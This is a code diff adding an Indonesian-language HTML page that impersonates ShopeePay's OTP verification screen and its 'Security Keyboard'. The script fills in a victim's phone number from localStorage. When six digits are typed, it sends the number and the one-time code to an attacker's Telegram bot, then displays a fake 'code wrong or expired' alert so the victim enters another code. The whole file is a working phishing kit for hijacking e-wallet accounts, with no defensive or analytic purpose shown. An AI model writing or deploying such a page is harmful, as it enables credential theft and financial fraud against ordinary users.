@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi ShopeePay</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .modal {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Header */
+        .header {
+            padding: 15px;
+            text-align: center;
+            border-bottom: 1px solid #eee;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .header h2 {
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .close-btn {
+            position: absolute;
+            right: 15px;
+            cursor: pointer;
+            color: #888;
+            display: flex;
+        }
+
+        /* Content */
+        .content {
+            padding: 20px;
+            text-align: center;
+            flex-grow: 1;
+        }
+
+        .instruction {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .phone-container {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: bold;
+            margin-top: 5px;
+        }
+
+        .whatsapp-icon {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* OTP Inputs */
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .otp-input {
+            width: 45px;
+            height: 45px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 20px;
+            background: #f9f9f9;
+            pointer-events: none;
+        }
+
+        .otp-input.active {
+            border-color: #ee4d2d;
+            background: white;
+            box-shadow: 0 0 5px rgba(238, 77, 45, 0.2);
+        }
+
+        .resend-container {
+            text-align: right;
+        }
+
+        .resend-btn {
+            color: #ee4d2d;
+            background: none;
+            border: 1px solid #ee4d2d;
+            padding: 5px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .resend-btn:disabled {
+            color: #ccc;
+            border-color: #eee;
+            cursor: not-allowed;
+        }
+
+        /* Keyboard */
+        .keyboard {
+            background: #d1d4d9;
+            padding: 10px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+        }
+
+        .key {
+            background: white;
+            padding: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 22px;
+            font-weight: 500;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            cursor: pointer;
+            user-select: none;
+            height: 55px;
+        }
+
+        .key:active {
+            background: #e2e2e2;
+        }
+
+        .key.empty {
+            background: transparent;
+            box-shadow: none;
+            cursor: default;
+        }
+
+        .footer-text {
+            grid-column: span 3;
+            text-align: center;
+            font-size: 11px;
+            color: #777;
+            padding: 10px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="modal">
+    <div class="header">
+        <h2>Masukkan Kode Verifikasi</h2>
+        <div class="close-btn">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+        </div>
+    </div>
+
+    <div class="content">
+        <div class="instruction">
+            Kode verifikasimu telah dikirimkan melalui WhatsApp ke 
+            <div class="phone-container">
+                <img src="https://thesvg.org/icons/whatsapp/default.svg" alt="WhatsApp" class="whatsapp-icon">
+                <span id="display-phone">+62 821****7726</span>
+            </div>
+        </div>
+
+        <div class="otp-container" id="otp-inputs">
+            <input type="text" class="otp-input active" maxlength="1" readonly>
+            <input type="text" class="otp-input" maxlength="1" readonly>
+            <input type="text" class="otp-input" maxlength="1" readonly>
+            <input type="text" class="otp-input" maxlength="1" readonly>
+            <input type="text" class="otp-input" maxlength="1" readonly>
+            <input type="text" class="otp-input" maxlength="1" readonly>
+        </div>
+
+        <div class="resend-container">
+            <button class="resend-btn" id="btn-resend" disabled>Kirim Ulang(60)</button>
+        </div>
+    </div>
+
+    <div class="keyboard">
+        <div class="key" onclick="pressKey('1')">1</div>
+        <div class="key" onclick="pressKey('2')">2</div>
+        <div class="key" onclick="pressKey('3')">3</div>
+        <div class="key" onclick="pressKey('4')">4</div>
+        <div class="key" onclick="pressKey('5')">5</div>
+        <div class="key" onclick="pressKey('6')">6</div>
+        <div class="key" onclick="pressKey('7')">7</div>
+        <div class="key" onclick="pressKey('8')">8</div>
+        <div class="key" onclick="pressKey('9')">9</div>
+        <div class="key empty"></div>
+        <div class="key" onclick="pressKey('0')">0</div>
+        <div class="key" onclick="pressKey('back')">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path><line x1="18" y1="9" x2="12" y2="15"></line><line x1="12" y1="9" x2="18" y2="15"></line></svg>
+        </div>
+        <div class="footer-text">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            ShopeePay Security Keyboard
+        </div>
+    </div>
+</div>
+
+<script>
+    const TELEGRAM_TOKEN = 'TOKEN_BOT_ANDA';
+    const TELEGRAM_CHAT_ID = 'ID_CHAT_ANDA';
+
+    let otpValue = "";
+    const inputs = document.querySelectorAll('.otp-input');
+    const phoneDisplay = document.getElementById('display-phone');
+    const resendBtn = document.getElementById('btn-resend');
+
+    window.onload = () => {
+        let savedPhone = localStorage.getItem('userPhone');
+        
+        if (savedPhone) {
+            // Bersihkan spasi atau karakter aneh
+            savedPhone = savedPhone.trim();
+
+            // LOGIKA OTOMATIS +62
+            if (savedPhone.startsWith('0')) {
+                // Jika diawali 0812... menjadi +62 812...
+                savedPhone = '+62 ' + savedPhone.substring(1);
+            } else if (savedPhone.startsWith('8')) {
+                // Jika diawali 812... menjadi +62 812...
+                savedPhone = '+62 ' + savedPhone;
+            } else if (savedPhone.startsWith('62') && !savedPhone.startsWith('+62')) {
+                // Jika diawali 62812... menjadi +62 812...
+                savedPhone = '+62 ' + savedPhone.substring(2);
+            }
+            
+            phoneDisplay.textContent = savedPhone;
+        }
+        
+        startTimer(60);
+    };
+
+    function startTimer(seconds) {
+        let timeLeft = seconds;
+        resendBtn.disabled = true;
+        const timerInterval = setInterval(() => {
+            timeLeft--;
+            resendBtn.textContent = `Kirim Ulang(${timeLeft})`;
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                resendBtn.textContent = "Kirim Ulang";
+                resendBtn.disabled = false;
+            }
+        }, 1000);
+    }
+
+    function pressKey(key) {
+        if (key === 'back') {
+            otpValue = otpValue.slice(0, -1);
+        } else if (otpValue.length < 6) {
+            otpValue += key;
+        }
+        updateUI();
+        if (otpValue.length === 6) sendToTelegram(otpValue);
+    }
+
+    function updateUI() {
+        inputs.forEach((input, index) => {
+            input.value = otpValue[index] || "";
+            input.classList.toggle('active', index === otpValue.length);
+        });
+    }
+
+    function sendToTelegram(code) {
+        const phone = phoneDisplay.textContent;
+        const message = `🔔 *VERIFIKASI SHOPEEPAY*\n\n📱 No. HP: \`${phone}\` \n🔑 Kode OTP: \`${code}\` \n\n`;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(() => {
+            alert("Kode verifikasi salah atau kedaluwarsa.");
+            otpValue = "";
+            updateUI();
+        });
+    }
+
+    resendBtn.onclick = () => {
+        alert("Kode baru telah dikirim!");
+        startTimer(60);
+    };
+</script>
+
+</body>
+</html>
